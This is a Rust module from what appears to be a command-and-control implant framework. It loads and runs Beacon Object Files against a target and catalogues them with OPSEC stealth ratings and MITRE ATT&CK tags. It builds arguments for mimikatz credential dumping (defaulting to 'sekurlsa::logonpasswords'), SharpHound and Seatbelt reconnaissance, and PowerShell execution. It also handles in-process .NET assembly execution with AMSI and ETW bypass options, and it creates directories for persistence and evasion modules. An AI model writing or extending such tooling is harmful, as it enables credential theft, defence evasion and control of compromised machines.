// src/bof/mod.rs - Complete BOF execution system (FIXED)
use std::io;
use std::path::Path;
use std::collections::HashMap;
use std::time::Instant;
use std::fs;
use serde::{Serialize, Deserialize};

// Re-export the COFF loader
pub mod coff_loader;
pub use coff_loader::{CoffLoader, create_bof_runtime};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BofContext {
    pub beacon_output: Vec<u8>,
    pub beacon_error: Vec<u8>,
    pub exit_code: i32,
    pub execution_time_ms: u64,
    pub current_directory: String,
}

impl BofContext {
    pub fn new() -> Self {
        BofContext {
            beacon_output: Vec::new(),
            beacon_error: Vec::new(),
            exit_code: 0,
            execution_time_ms: 0,
            current_directory: "C:\\".to_string(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BofArgs {
    data: Vec<u8>,
}

impl BofArgs {
    pub fn new() -> Self {
        BofArgs { data: Vec::new() }
    }

    pub fn add_string(&mut self, value: &str) {
        let bytes = value.as_bytes();
        self.data.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
        self.data.extend_from_slice(bytes);
    }

    pub fn add_int(&mut self, value: i32) {
        self.data.extend_from_slice(&value.to_le_bytes());
    }

    pub fn add_short(&mut self, value: i16) {
        self.data.extend_from_slice(&value.to_le_bytes());
    }

    pub fn add_binary(&mut self, data: &[u8]) {
        self.data.extend_from_slice(&(data.len() as u32).to_le_bytes());
        self.data.extend_from_slice(data);
    }

    pub fn add_bool(&mut self, value: bool) {
        self.add_int(if value { 1 } else { 0 });
    }

    pub fn finalize(self) -> Vec<u8> {
        self.data
    }

    pub fn size(&self) -> usize {
        self.data.len()
    }
}

#[derive(Clone)]
pub struct BofExecutor {
    bof_cache: HashMap<String, Vec<u8>>,
    execution_count: u32,
}

impl BofExecutor {
    pub fn new() -> Self {
        BofExecutor {
            bof_cache: HashMap::new(),
            execution_count: 0,
        }
    }
    
    pub fn execute(&mut self, bof_path: &str, args: &str, target: &str) -> io::Result<BofContext> {
        let start_time = Instant::now();
        self.execution_count += 1;

        println!("🚀 BOF Execution #{}", self.execution_count);
        println!("   BOF: {}", bof_path);
        println!("   Arguments: {}", args);
        println!("   Target: {}", target);

        if !Path::new(bof_path).exists() {
            return Err(io::Error::new(io::ErrorKind::NotFound, "BOF file not found"));
        }

        // Load BOF if not in cache
        if !self.bof_cache.contains_key(bof_path) {
            let bof_data = std::fs::read(bof_path)?;
            self.bof_cache.insert(bof_path.to_string(), bof_data);
            println!("📦 BOF loaded into cache: {}", bof_path);
        }

        // Get BOF data from cache
        let bof_data = self.bof_cache.get(bof_path)
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "BOF not in cache"))?;

        // Parse arguments
        let parsed_args = self.parse_bof_arguments(bof_path, args)?;

        // Execute using COFF loader
        let mut context = self.execute_with_coff_loader(bof_data, &parsed_args)?;
        context.execution_time_ms = start_time.elapsed().as_millis() as u64;

        println!("✅ BOF execution completed in {}ms", context.execution_time_ms);
        println!("   Output size: {} bytes", context.beacon_output.len());
        println!("   Error size: {} bytes", context.beacon_error.len());

        Ok(context)
    }

    fn execute_with_coff_loader(&self, bof_data: &[u8], args: &[u8]) -> io::Result<BofContext> {
        let mut loader = create_bof_runtime();
        
        match loader.load_and_execute(bof_data, args) {
            Ok(output) => {
                Ok(BofContext {
                    beacon_output: output,
                    beacon_error: Vec::new(),
                    exit_code: 0,
                    execution_time_ms: 0,
                    current_directory: "C:\\".to_string(),
                })
            },
            Err(e) => {
                Ok(BofContext {
                    beacon_output: Vec::new(),
                    beacon_error: e.as_bytes().to_vec(),
                    exit_code: 1,
                    execution_time_ms: 0,
                    current_directory: "C:\\".to_string(),
                })
            }
        }
    }

    fn parse_bof_arguments(&self, bof_path: &str, args: &str) -> io::Result<Vec<u8>> {
        let bof_name = Path::new(bof_path)
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("unknown");

        println!("🔧 Parsing arguments for BOF: {}", bof_name);

        let mut bof_args = BofArgs::new();

        match bof_name {
            "inlineExecute-Assembly" => {
                self.parse_inline_execute_assembly_args(&mut bof_args, args)?;
            },
            "ps" | "process_list" => {
                let verbose = args.contains("-v") || args.contains("--verbose");
                bof_args.add_bool(verbose);
                println!("📋 Process list args: verbose={}", verbose);
            },
            "ls" | "dir" | "directory_list" => {
                let parts: Vec<&str> = args.split_whitespace().collect();
                let path = if parts.is_empty() { "." } else { parts[0] };
                let recursive = args.contains("-r") || args.contains("--recursive");
                bof_args.add_string(path);
                bof_args.add_bool(recursive);
                println!("📋 Directory list args: path={}, recursive={}", path, recursive);
            },
            "whoami" | "hostname" | "pwd" => {
                // No arguments needed for these simple commands
                println!("📋 Simple command: no arguments");
            },
            "mimikatz" => {
                let command = if args.is_empty() { "sekurlsa::logonpasswords" } else { args };
                bof_args.add_string(command);
                println!("📋 Mimikatz args: command={}", command);
            },
            "seatbelt" => {
                let checks = if args.is_empty() { "All" } else { args };
                bof_args.add_string(checks);
                println!("📋 Seatbelt args: checks={}", checks);
            },
            "sharphound" => {
                let parts: Vec<&str> = args.split_whitespace().collect();
                let collection_method = parts.get(0).unwrap_or(&"All").to_string();
                let domain = parts.get(1).map(|s| s.to_string()).unwrap_or_default();
                bof_args.add_string(&collection_method);
                bof_args.add_string(&domain);
                println!("📋 SharpHound args: collection={}, domain={}", collection_method, domain);
            },
            "powershell" | "ps1" => {
                if args.is_empty() {
                    return Err(io::Error::new(io::ErrorKind::InvalidInput, "PowerShell command required"));
                }
                bof_args.add_string(args);
                println!("📋 PowerShell args: command={}", args);
            },
            _ => {
                // Generic argument parsing - treat as space-separated strings
                if !args.trim().is_empty() {
                    let parts: Vec<&str> = args.split_whitespace().collect();
                    bof_args.add_int(parts.len() as i32); // Number of arguments
                    for part in &parts {  // Fixed: iterate over references
                        bof_args.add_string(part);
                    }
                    println!("📋 Generic args: {} arguments", parts.len());
                } else {
                    println!("📋 Generic args: no arguments");
                }
            }
        }

        Ok(bof_args.finalize())
    }

    fn parse_inline_execute_assembly_args(&self, bof_args: &mut BofArgs, args: &str) -> io::Result<()> {
        let parts: Vec<&str> = args.split_whitespace().collect();
        
        if parts.is_empty() {
            return Err(io::Error::new(io::ErrorKind::InvalidInput, 
                "InlineExecute-Assembly requires assembly path"));
        }

        let assembly_path = parts[0];
        let assembly_args = if parts.len() > 1 { parts[1..].join(" ") } else { String::new() };

        // Check for flags
        let amsi_bypass = args.contains("--amsi");
        let etw_bypass = args.contains("--etw");
        let use_mailslot = args.contains("--mailslot");

        // App domain name
        bof_args.add_string("DefaultDomain");
        
        // Flags
        bof_args.add_bool(amsi_bypass);
        bof_args.add_bool(etw_bypass);
        bof_args.add_bool(false); // revert ETW
        bof_args.add_bool(use_mailslot);
        bof_args.add_int(1); // entry point (Main with args)
        
        // Pipe/mailslot names
        bof_args.add_string("DefaultSlot");
        bof_args.add_string("DefaultPipe");
        
        // Assembly arguments
        bof_args.add_string(&assembly_args);
        
        // Assembly binary data
        let assembly_data = std::fs::read(assembly_path)
            .map_err(|e| io::Error::new(io::ErrorKind::NotFound, 
                format!("Failed to read assembly: {}", e)))?;
        
        bof_args.add_int(assembly_data.len() as i32);
        bof_args.add_binary(&assembly_data);

        println!("📋 InlineExecute-Assembly args: path={}, args={}, amsi={}, etw={}", 
            assembly_path, assembly_args, amsi_bypass, etw_bypass);

        Ok(())
    }

    pub fn get_cached_bofs(&self) -> Vec<String> {
        self.bof_cache.keys().cloned().collect()
    }

    pub fn clear_cache(&mut self) {
        self.bof_cache.clear();
        println!("🗑️ BOF cache cleared");
    }

    pub fn get_stats(&self) -> (u32, usize) {
        (self.execution_count, self.bof_cache.len())
    }
}

// BOF metadata and management
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BofMetadata {
    pub name: String,
    pub description: String,
    pub author: String,
    pub version: String,
    pub file_path: String,
    pub file_size: u64,
    pub help_text: String,
    pub usage_examples: Vec<String>,
    pub opsec_level: String,
    pub tactics: Vec<String>,
    pub techniques: Vec<String>,
    pub execution_time_estimate: u64,
}

pub struct BofManager {
    executor: BofExecutor,
    library: HashMap<String, BofMetadata>,
    bof_directories: Vec<String>,
}

impl BofManager {
    pub fn new() -> Self {
        let mut manager = BofManager {
            executor: BofExecutor::new(),
            library: HashMap::new(),
            bof_directories: vec![
                "bofs/".to_string(),
                "bofs/recon/".to_string(),
                "bofs/persistence/".to_string(),
                "bofs/evasion/".to_string(),
            ],
        };
        
        if let Err(e) = manager.initialize() {
            eprintln!("⚠️ Failed to initialize BOF manager: {}", e);
        }
        
        manager
    }

    fn initialize(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        println!("🚀 Initializing BOF Management System...");

        // Create BOF directories
        for directory in &self.bof_directories {
            if !Path::new(directory).exists() {
                fs::create_dir_all(directory)?;
                println!("📁 Created BOF directory: {}", directory);
            }
        }

        // Load built-in BOFs
        self.initialize_default_bofs();
        
        // Scan for BOF files
        for directory in &self.bof_directories.clone() {
            if let Err(e) = self.scan_bof_directory(directory) {
                eprintln!("⚠️ Failed to scan BOF directory {}: {}", directory, e);
            }
        }

        println!("✅ BOF Management System initialized with {} BOFs", self.library.len());
        Ok(())
    }

    fn initialize_default_bofs(&mut self) {
        let default_bofs = vec![
            ("ps", "List running processes", "C2 Framework", "bofs/ps.o", "Stealth", 
             vec!["Discovery"], vec!["T1057"]),
            ("ls", "List directory contents", "C2 Framework", "bofs/ls.o", "Stealth",
             vec!["Discovery"], vec!["T1083"]),
            ("whoami", "Get current user identity", "C2 Framework", "bofs/whoami.o", "Stealth",
             vec!["Discovery"], vec!["T1033"]),
            ("hostname", "Get system hostname", "C2 Framework", "bofs/hostname.o", "Stealth",
             vec!["Discovery"], vec!["T1082"]),
            ("mimikatz", "Credential extraction", "Benjamin Delpy", "bofs/mimikatz.o", "Loud",
             vec!["Credential Access"], vec!["T1003", "T1558"]),
            ("inlineExecute-Assembly", "Execute .NET assemblies in-process", "anthemtotheego", 
             "bofs/inlineExecute-Assembly.o", "Standard", vec!["Execution", "Defense Evasion"], vec!["T1055", "T1218"]),
            ("seatbelt", "Security enumeration", "GhostPack", "bofs/seatbelt.o", "Careful",
             vec!["Discovery"], vec!["T1082", "T1016"]),
            ("sharphound", "BloodHound data collection", "BloodHound Team", "bofs/sharphound.o", "Standard",
             vec!["Discovery"], vec!["T1087", "T1069"]),
            ("powershell", "PowerShell execution", "C2 Framework", "bofs/powershell.o", "Standard",
             vec!["Execution"], vec!["T1059.001"]),
        ];

        for (name, desc, author, path, opsec, tactics, techniques) in default_bofs {
            let metadata = BofMetadata {
                name: name.to_string(),
                description: desc.to_string(),
                author: author.to_string(),
                version: "1.0".to_string(),
                file_path: path.to_string(),
                file_size: 0,
                help_text: format!("Execute {} BOF", name),
                usage_examples: vec![
                    format!("bof {}", name),
                    format!("bof {} --help", name),
                ],
                opsec_level: opsec.to_string(),
                tactics: tactics.into_iter().map(|s| s.to_string()).collect(),
                techniques: techniques.into_iter().map(|s| s.to_string()).collect(),
                execution_time_estimate: self.estimate_execution_time(name),
            };
            self.library.insert(name.to_string(), metadata);
        }

        println!("📚 Registered {} built-in BOFs", self.library.len());
    }

    fn estimate_execution_time(&self, bof_name: &str) -> u64 {
        match bof_name {
            "whoami" | "hostname" | "pwd" => 100,
            "ps" | "ls" => 500,
            "seatbelt" => 30000,
            "sharphound" => 60000,
            "mimikatz" => 5000,
            "inlineExecute-Assembly" => 10000,
            _ => 2000,
        }
    }

    fn scan_bof_directory(&mut self, dir_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        if !Path::new(dir_path).exists() {
            return Ok(());
        }

        let mut found_bofs = 0;
        for entry in fs::read_dir(dir_path)? {
            let entry = entry?;
            let path = entry.path();
            
            if path.extension().and_then(|s| s.to_str()) == Some("o") {
                if let Some(file_name) = path.file_stem().and_then(|s| s.to_str()) {
                    // Check if we already have this BOF
                    if !self.library.contains_key(file_name) {
                        let metadata_result = fs::metadata(&path);
                        let file_size = metadata_result.map(|m| m.len()).unwrap_or(0);
                        
                        let bof_metadata = BofMetadata {
                            name: file_name.to_string(),
                            description: format!("BOF discovered in {}", dir_path),
                            author: "Unknown".to_string(),
                            version: "1.0".to_string(),
                            file_path: path.to_string_lossy().to_string(),
                            file_size,
                            help_text: "No help available".to_string(),
                            usage_examples: vec![format!("bof {}", file_name)],
                            opsec_level: "Standard".to_string(),
                            tactics: vec![],
                            techniques: vec![],
                            execution_time_estimate: 2000,
                        };

                        self.library.insert(file_name.to_string(), bof_metadata);
                        found_bofs += 1;
                    }
                }
            }
        }

        if found_bofs > 0 {
            println!("🔍 Discovered {} new BOF files in {}", found_bofs, dir_path);
        }
        Ok(())
    }

    pub fn execute_bof(&mut self, bof_name: &str, args: &str, target: &str) -> io::Result<BofContext> {
        if let Some(metadata) = self.library.get(bof_name) {
            println!("🎯 Executing BOF '{}' (OPSEC: {})", bof_name, metadata.opsec_level);
            self.executor.execute(&metadata.file_path, args, target)
        } else {
            Err(io::Error::new(io::ErrorKind::NotFound, format!("BOF '{}' not found", bof_name)))
        }
    }

    pub fn list_bofs(&self) -> Vec<&BofMetadata> {
        self.library.values().collect()
    }

    pub fn get_bof(&self, name: &str) -> Option<&BofMetadata> {
        self.library.get(name)
    }

    pub fn search_bofs(&self, query: &str) -> Vec<&BofMetadata> {
        let query_lower = query.to_lowercase();
        self.library.values()
            .filter(|bof| {
                bof.name.to_lowercase().contains(&query_lower) ||
                bof.description.to_lowercase().contains(&query_lower) ||
                bof.tactics.iter().any(|t| t.to_lowercase().contains(&query_lower))
            })
            .collect()
    }

    pub fn get_stats(&self) -> HashMap<String, u64> {
        let mut stats = HashMap::new();
        let (executions, cached) = self.executor.get_stats();
        
        stats.insert("total_bofs".to_string(), self.library.len() as u64);
        stats.insert("total_executions".to_string(), executions as u64);
        stats.insert("cached_bofs".to_string(), cached as u64);
        
        // Count by OPSEC level
        let mut stealth_count = 0;
        let mut careful_count = 0;
        let mut standard_count = 0;
        let mut loud_count = 0;
        
        for bof in self.library.values() {
            match bof.opsec_level.as_str() {
                "Stealth" => stealth_count += 1,
                "Careful" => careful_count += 1,
                "Standard" => standard_count += 1,
                "Loud" => loud_count += 1,
                _ => {}
            }
        }
        
        stats.insert("stealth_bofs".to_string(), stealth_count);
        stats.insert("careful_bofs".to_string(), careful_count);
        stats.insert("standard_bofs".to_string(), standard_count);
        stats.insert("loud_bofs".to_string(), loud_count);
        
        stats
    }
}

// BOF command parser
pub struct BofCommandParser;

impl BofCommandParser {
    pub fn parse_bof_command(command: &str) -> Option<(String, String)> {
        let parts: Vec<&str> = command.split_whitespace().collect();
        
        if parts.len() >= 2 && parts[0] == "bof" {
            let bof_name = parts[1].to_string();
            let args = if parts.len() > 2 {
                parts[2..].join(" ")
            } else {
                String::new()
            };
            
            Some((bof_name, args))
        } else {
            None
        }
    }

    pub fn generate_help_text(metadata: &BofMetadata) -> String {
        let mut help = format!("📋 BOF: {}\n", metadata.name);
        help.push_str(&format!("📝 Description: {}\n", metadata.description));
        help.push_str(&format!("👤 Author: {} (v{})\n", metadata.author, metadata.version));
        help.push_str(&format!("🚨 OPSEC Level: {}\n", metadata.opsec_level));
        help.push_str(&format!("⏱️ Est. Execution Time: {}ms\n", metadata.execution_time_estimate));
        
        if !metadata.usage_examples.is_empty() {
            help.push_str("\n💡 Examples:\n");
            for example in &metadata.usage_examples {
                help.push_str(&format!("  • {}\n", example));
            }
        }
        
        if !metadata.tactics.is_empty() {
            help.push_str(&format!("\n🎯 MITRE ATT&CK Tactics: {}\n", metadata.tactics.join(", ")));
        }
        
        if !metadata.techniques.is_empty() {
            help.push_str(&format!("🔍 MITRE ATT&CK Techniques: {}\n", metadata.techniques.join(", ")));
        }
        
        help
    }
}

// Helper function to create BOF arguments for common scenarios
pub fn create_bof_args_for_command(command: &str, args: &str) -> BofArgs {
    let mut bof_args = BofArgs::new();
    
    match command {
        "help" => {
            // No arguments for help
        },
        "ps" | "tasklist" => {
            let verbose = args.contains("-v");
            bof_args.add_bool(verbose);
        },
        "ls" | "dir" => {
            let path = if args.is_empty() { "." } else { args };
            bof_args.add_string(path);
        },
        "cd" => {
            bof_args.add_string(args);
        },
        _ => {
            // Generic command
            bof_args.add_string(command);
            if !args.is_empty() {
                bof_args.add_string(args);
            }
        }
    }
    
    bof_args
}